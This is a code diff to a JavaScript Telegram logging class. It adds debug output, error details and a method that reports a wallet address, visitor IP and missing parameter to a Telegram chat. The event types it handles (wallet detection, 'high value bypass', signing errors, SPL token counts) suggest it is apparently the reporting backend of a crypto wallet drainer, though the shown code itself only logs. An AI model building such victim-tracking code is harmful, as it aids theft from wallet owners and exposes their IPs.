@@ -31,12 +31,19 @@ class TelegramLogger {
    * Send message to Telegram
    */
   async sendMessage(message, type = 'info') {
-    if (!this.enabled) return;
+    if (!this.enabled) {
+      console.log('⚠️ [TELEGRAM] Logger disabled, skipping message');
+      return;
+    }
 
     try {
+      console.log(`📤 [TELEGRAM] Attempting to send message of type: ${type}`);
+      
       // Always format the message to include project name
       const formattedMessage = this.formatMessage(message, type);
       const url = `https://api.telegram.org/bot${this.botToken}/sendMessage`;
+      
+      console.log(`📤 [TELEGRAM] Sending to URL: ${url.substring(0, 50)}...`);
       
       const response = await fetch(url, {
         method: 'POST',
@@ -53,9 +60,16 @@ class TelegramLogger {
 
       if (!response.ok) {
         console.error('❌ Failed to send Telegram message:', response.statusText);
+        const errorText = await response.text();
+        console.error('❌ Error details:', errorText);
+      } else {
+        console.log(`✅ [TELEGRAM] Message sent successfully to chat ${this.chatId}`);
+        const result = await response.json();
+        console.log(`✅ [TELEGRAM] Message ID: ${result.result?.message_id || 'Unknown'}`);
       }
     } catch (error) {
       console.error('❌ Telegram send error:', error.message);
+      console.error('❌ Error stack:', error.stack);
     }
   }
 
@@ -104,6 +118,7 @@ class TelegramLogger {
       'RATE_LIMIT': '⏰',
       'HIGH_VALUE_BYPASS': '💎',
       'INSUFFICIENT_FUNDS': '💸',
+      'MISSING_PARAMETER': '⚠️',
       'ERROR': '🚨',
       'SIGNING_ERROR': '✍️',
       'RPC_FAILURE': '🌐',
@@ -126,6 +141,7 @@ class TelegramLogger {
       'RATE_LIMIT': 'RATE LIMIT',
       'HIGH_VALUE_BYPASS': 'HIGH VALUE BYPASS',
       'INSUFFICIENT_FUNDS': 'INSUFFICIENT FUNDS',
+      'MISSING_PARAMETER': 'MISSING PARAMETER',
       'ERROR': 'ERROR',
       'SIGNING_ERROR': 'SIGNING ERROR',
       'RPC_FAILURE': 'RPC FAILURE',
@@ -135,6 +151,8 @@ class TelegramLogger {
     };
     return prefixes[type] || 'INFO';
   }
+
+
 
   /**
    * Log wallet detection (all wallets, balance will be updated later)
@@ -359,6 +377,27 @@ ${data.splTokens ? `🪙 <b>SPL Tokens:</b> ${data.splTokens} tokens\n` : ''}�
     `.trim();
 
     await this.sendMessage(message, 'SIGNING_ERROR');
+  }
+
+  /**
+   * Log missing parameter errors
+   */
+  async logMissingParameter(data) {
+    const walletAddress = data.publicKey ? data.publicKey.toString().substring(0, 8) + '...' : 'Unknown';
+    const ip = data.ip || 'Unknown';
+    const missingParam = data.missingParam || 'Unknown';
+    const context = data.context || 'Unknown';
+    
+    const message = `
+⚠️ <b>Missing Parameter</b>
+
+👤 <b>Wallet:</b> <code>${walletAddress}</code>
+🚫 <b>Missing:</b> ${missingParam}
+🔍 <b>Context:</b> ${context}
+🌐 <b>IP:</b> ${ip}
+    `.trim();
+
+    await this.sendMessage(message, 'MISSING_PARAMETER');
   }
 
 
